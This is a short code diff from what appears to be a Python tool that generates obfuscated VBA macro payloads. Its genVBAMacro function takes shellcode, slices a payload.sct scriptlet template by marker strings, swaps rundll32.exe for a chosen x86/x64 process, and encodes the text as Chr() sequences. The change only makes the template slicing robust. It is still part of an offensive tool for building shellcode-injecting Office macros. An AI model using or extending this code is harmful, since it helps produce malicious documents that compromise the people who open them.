@@ -4,6 +4,7 @@ from string import ascii_uppercase, digits
 from random import choice
 from shutil import copyfile, which
 from fileops import fileFindReplace
+from fileops import getFileStringLineNum
 import re
 from os import system
 from sys import exit
@@ -63,11 +64,11 @@ def genVBAMacro(shellCode, x86, x64):
 	end = []
 
 	with open('payload.sct', 'r') as payloadFile:
-		for line in itertools.islice(payloadFile, 0, 34):
+		for line in itertools.islice(payloadFile, 0, getFileStringLineNum('xlmodule.CodeModule.AddFromString')):
 			start.append(line)
 	
 	with open('payload.sct', 'r') as payloadFile:
-		for line in itertools.islice(payloadFile, 35, 129):
+		for line in itertools.islice(payloadFile, getFileStringLineNum('Private Type PROCESS_INFORMATION') - 1, getFileStringLineNum('objExcel.DisplayAlerts') - 1):
 			if 'SysWOW64' in line:
 				textToEncode += line.replace('rundll32.exe' , x64)
 				textToEncodeList.append(line)
@@ -80,7 +81,7 @@ def genVBAMacro(shellCode, x86, x64):
 
 
 	with open('payload.sct', 'r') as payloadFile:
-		for line in itertools.islice(payloadFile, 130, 146):
+		for line in itertools.islice(payloadFile, getFileStringLineNum('objExcel.DisplayAlerts') - 1, getFileStringLineNum('</scriptlet>') + 1):
 			end.append(line)
 
 	encodedList = convertToVBAFormat(encodeStringAsChr(textToEncode))
